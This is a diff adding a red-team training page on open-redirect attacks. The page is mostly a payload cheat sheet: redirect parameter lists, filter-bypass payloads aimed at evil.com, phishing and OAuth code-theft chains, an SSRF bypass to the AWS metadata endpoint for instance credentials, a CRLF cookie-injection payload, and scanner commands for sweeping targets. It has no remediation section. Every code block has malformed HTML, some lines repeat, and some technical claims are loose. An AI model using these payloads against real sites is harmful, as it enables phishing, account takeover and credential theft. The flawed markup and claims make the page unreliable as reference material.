@@ -1,0 +1,184 @@
+---
+layout: training-page
+title: "Open Redirect — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - open-redirect
+  - phishing
+  - oauth
+  - ssrf
+  - web-attacks
+page_key: "web-open-redirect"
+---
+<h1>Open Redirect</h1>
+<p>An open redirect occurs when an application accepts a user-controlled URL and redirects the browser to it without validation. While often dismissed as low-severity, open redirects are valuable in attack chains: they lend phishing links an air of legitimacy (the domain is real), can bypass SSRF filters that allowlist trusted origins, enable OAuth redirect_uri abuse, and serve as delivery vehicles for further exploitation. In bug bounty programs they are commonly accepted when chained with another vulnerability.</p>
+
+  <h2>Where to Find Open Redirects</h2>
+  <pre><code"># Common parameter names that trigger redirects — test all of these:
+?next=
+?url=
+?target=
+?rurl=
+?dest=
+?destination=
+?redir=
+?redirect_uri=
+?redirect_url=
+?redirect=
+?return=
+?returnTo=
+?return_to=
+?return_path=
+?checkout_url=
+?continue=
+?view=
+?go=
+?image_url=
+
+# Path-based redirect patterns:
+/redirect/{url}
+/out/{url}
+/out?{url}
+/cgi-bin/redirect.cgi?{url}
+/login?to={url}
+
+# Burp search for redirect parameters:
+# Proxy history → Search → "=http" or "=aHR0" (base64 of "htt")
+# Filter responses with 3xx status codes</code></pre>
+
+  <h2>Basic Payloads</h2>
+  <pre><code"># Direct redirect to external host:
+https://target.com/redirect?url=https://evil.com
+https://target.com/redirect?url=//evil.com
+https://target.com/redirect?url=/\evil.com
+
+# Protocol confusion:
+https://target.com/redirect?url=javascript:alert(1)
+https://target.com/redirect?url=data:text/html,<script>alert(1)</script>
+
+# Subdomain bypass — attacker registers target.com.evil.com:
+https://target.com/redirect?url=https://target.com.evil.com
+https://target.com/redirect?url=https://evil.com?target.com
+
+# URL confusion — browser sends to evil.com:
+http://www.theirsite.com@yoursite.com/
+http://target.com\evil.com
+http://target.com/http://evil.com/
+
+# Double slash / backslash tricks:
+//evil.com
+///evil.com
+/\/evil.com
+\/evil.com
+\\evil.com</code></pre>
+
+  <h2>Filter Bypass Techniques</h2>
+  <pre><code"># If the filter checks that URL starts with target.com:
+https://target.com@evil.com        # user@host format — browser goes to evil.com
+https://target.com.evil.com        # subdomain confusion
+/\/evil.com                        # parsed as //evil.com by some browsers
+//evil.com/%2f..                   # path traversal after host
+//www.google.com/%2f%2e%2e        # URL-encoded /../
+
+# Unicode / internationalized:
+/?redir=google。com               # Japanese period (。) — looks like a dot
+//google%E3%80%82com              # URL-encoded Japanese period
+//google%00.com                   # null byte truncation
+
+# Tab / whitespace:
+/%09/evil.com                      # tab character
+/ /evil.com                        # space
+
+# Path traversal:
+/www.evil.com/../redirect?url=https://evil.com
+
+# Parameter pollution:
+?redirect=https://target.com&redirect=https://evil.com  # last value wins
+
+# Always URL-encode payloads when injecting into existing parameters:
+# https://evil.com → https%3A%2F%2Fevil.com</code></pre>
+
+  <h2>Attack Scenarios</h2>
+  <h3>Phishing Chain</h3>
+  <pre><code"># Attacker sends:
+https://legitimate-bank.com/login?next=https://evil-phishing.com/fake-login
+
+# Victim sees legitimate-bank.com in the URL bar → clicks → gets phished
+# The redirect happens server-side before the victim realizes
+# Very effective because the initial URL passes link scanners</code></pre>
+
+  <h3>OAuth Abuse</h3>
+  <pre><code"># OAuth flow uses redirect_uri to return the auth code:
+https://provider.com/oauth/authorize?client_id=APP&redirect_uri=https://app.com/callback
+
+# If the app has an open redirect:
+https://provider.com/oauth/authorize?client_id=APP&redirect_uri=https://app.com/redirect?url=https://evil.com
+
+# OAuth sends the auth code to: https://app.com/redirect?url=https://evil.com
+# App redirects to evil.com, which captures the code from the Referer header
+# → account takeover without any user interaction beyond clicking "Authorize"</code></pre>
+
+  <h3>SSRF Filter Bypass</h3>
+  <pre><code"># Application allowlists certain trusted hosts for SSRF prevention:
+# Only allows fetches to: s3.amazonaws.com, api.partner.com
+
+# If api.partner.com has an open redirect:
+https://vulnerable-app.com/fetch?url=https://api.partner.com/redirect?url=http://169.254.169.254/latest/meta-data/
+
+# The SSRF allowlist check passes (api.partner.com is trusted)
+# api.partner.com redirects to AWS metadata endpoint
+# Attacker gets EC2 instance credentials</code></pre>
+
+  <h2>Tools</h2>
+  <pre><code"># Oralyzer — automated open redirect scanner:
+# https://github.com/0xNanda/Oralyzer
+python3 oralyzer.py -u https://website.com/redir?url=
+
+# OpenRedireX — fuzz open redirects with payloads:
+# https://github.com/devanshbatham/OpenRedireX
+python3 openredirex.py -u "https://website.com/?url=FUZZ" -p payloads.txt --keyword FUZZ
+
+# ffuf — sweep all redirect params from a wordlist:
+ffuf -u "https://target.com/FUZZ=https://evil.com" \
+  -w /opt/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -mc 301,302,303,307,308
+
+# From URL list (Wayback/gau output):
+gau target.com | grep -E "[?&](url|next|redirect|redir|return|dest)=" \
+  | sed 's/=.*/=https:\/\/evil.com/' > redirect_test.txt
+ffuf -u FUZZ -w redirect_test.txt -mc 301,302,303
+
+# PayloadsAllTheThings wordlist:
+# https://github.com/m0chan/BugBounty/blob/master/OpenRedirectFuzzing.txt</code></pre>
+
+  <h2>Valid Redirect Payload Formats</h2>
+  <pre><code"># These formats often bypass naive "starts with http" or "contains domain" checks:
+http://evil.com
+https://evil.com
+http://evil.com
+https://evil.com
+//evil.com
+///evil.com
+/\evil.com
+\/evil.com
+/\/evil.com
+\\evil.com
+\/\evil.com
+
+# Victim-site confusion:
+http://target.com@evil.com       # browser authenticates to evil.com as target.com user
+https://evil.com?target.com      # filter sees target.com in URL — browser goes to evil.com
+https://evil.com#target.com      # fragment doesn't affect destination
+
+# Newline injection (chains with CRLF):
+https://evil.com%0d%0aSet-Cookie:session=hijacked</code></pre>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>Oralyzer — open redirect scanner — <code>github.com/0xNanda/Oralyzer</code></li>
+    <li>OpenRedireX — fuzzer — <code>github.com/devanshbatham/OpenRedireX</code></li>
+    <li>PayloadsAllTheThings Open Redirect — <code>github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect</code></li>
+    <li>HackTricks Open Redirect — <code>book.hacktricks.xyz/pentesting-web/open-redirect</code></li>
+    <li>OpenRedirectFuzzing wordlist — <code>github.com/m0chan/BugBounty/blob/master/OpenRedirectFuzzing.txt</code></li>
+    <li>OWASP A01:2021 — Broken Access Control — <code>owasp.org/Top10/A01_2021-Broken_Access_Control/</code></li>
+  </ul>
